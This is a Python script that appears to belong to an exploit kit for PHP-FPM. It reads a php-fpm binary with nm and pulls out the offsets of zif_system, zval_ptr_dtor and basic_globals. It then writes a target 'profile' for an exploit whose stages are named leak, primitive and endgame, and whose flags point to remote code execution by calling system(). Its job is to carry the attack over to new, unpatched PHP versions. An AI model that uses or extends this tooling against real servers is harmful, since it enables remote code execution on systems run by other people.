#!/usr/bin/env python3
"""Generate a draft FPM profile from a PHP-FPM binary.

The generator extracts the three symbols needed by the exploit with ``nm`` and
copies the allocator/leak geometry from a known-good template.  A generated
profile is intentionally marked ``verified: false`` and ``rce: false``: symbols
alone do not prove the heap geometry, so it must still be calibrated against a
lab with ``leak``/``primitive``/``endgame`` before it is trusted.
"""

from __future__ import annotations

import argparse
import copy
import json
import os
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SYMBOLS = ("zif_system", "zval_ptr_dtor", "basic_globals")
FIXED_IN = {"8.4": "8.4.27", "8.5": "8.5.12"}


def parse_nm(text: str) -> dict[str, int]:
    """Return the offsets of the required symbols from ``nm -n`` output."""
    found: dict[str, int] = {}
    for line in text.splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        address, name = parts[0], parts[2]
        if name not in SYMBOLS or name in found:
            continue
        try:
            found[name] = int(address, 16)
        except ValueError:
            continue
    missing = [name for name in SYMBOLS if name not in found]
    if missing:
        raise ValueError(f"missing symbols: {', '.join(missing)}")
    return found


def read_symbols(binary: str) -> dict[str, int]:
    proc = subprocess.run(["nm", "-n", binary], capture_output=True, text=True)
    if proc.returncode != 0:
        detail = proc.stderr.strip() or f"nm exited {proc.returncode}"
        raise RuntimeError(f"cannot read symbols from {binary}: {detail}")
    return parse_nm(proc.stdout)


def build_draft(version: str, symbols: dict[str, int], template: dict,
                distro: str = "debian", arch: str = "amd64",
                fixed_in: str | None = None) -> dict:
    profile = copy.deepcopy(template)
    branch = ".".join(version.split(".")[:2])
    profile.update({
        "name": f"php-{version}-fpm",
        "php_version": version,
        "branch": branch,
        "fixed_in": fixed_in or FIXED_IN.get(branch, "unknown"),
        "verified": False,
        "rce": False,
        "distro": distro,
        "arch": arch,
        "status": (
            "Draft profile: symbols extracted with nm; allocator, reclaim, "
            "no-oracle, and leak geometry copied from the template and NOT "
            "calibrated. Run leak/primitive/endgame in a lab and update the "
            "geometry and verified flags before trusting this profile."
        ),
    })
    profile["libphp"]["zif_system"] = hex(symbols["zif_system"])
    profile["libphp"]["zval_ptr_dtor"] = hex(symbols["zval_ptr_dtor"])
    profile["fpm"]["basic_globals"] = hex(symbols["basic_globals"])
    return profile


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--php-fpm", required=True,
                        help="path to the php-fpm binary to inspect")
    parser.add_argument("--version", required=True,
                        help="PHP version, for example 8.4.25")
    parser.add_argument("--template",
                        default=os.path.join(ROOT, "profiles",
                                             "8.4.26-fpm.json"),
                        help="known-good profile to copy geometry from")
    parser.add_argument("--output", default=None,
                        help="output path (default profiles/<version>-fpm.json)")
    parser.add_argument("--distro", default="debian")
    parser.add_argument("--arch", default="amd64")
    parser.add_argument("--fixed-in", default=None)
    parser.add_argument("--force", action="store_true",
                        help="overwrite an existing output file")
    args = parser.parse_args()

    output = args.output or os.path.join(
        ROOT, "profiles", f"{args.version}-fpm.json")
    if os.path.exists(output) and not args.force:
        parser.error(f"{output} exists; pass --force to overwrite")

    try:
        with open(args.template, encoding="utf-8") as handle:
            template = json.load(handle)
        symbols = read_symbols(args.php_fpm)
        profile = build_draft(args.version, symbols, template,
                              distro=args.distro, arch=args.arch,
                              fixed_in=args.fixed_in)
    except (OSError, RuntimeError, ValueError, KeyError, TypeError) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    with open(output, "w", encoding="utf-8") as handle:
        json.dump(profile, handle, indent=2)
        handle.write("\n")
    print(f"[+] wrote draft {output}")
    print(f"    zif_system=0x{symbols['zif_system']:x} "
          f"zval_ptr_dtor=0x{symbols['zval_ptr_dtor']:x} "
          f"basic_globals=0x{symbols['basic_globals']:x}")
    print("    geometry was copied from the template; calibrate before use")
    return 0


if __name__ == "__main__":
    sys.exit(main())
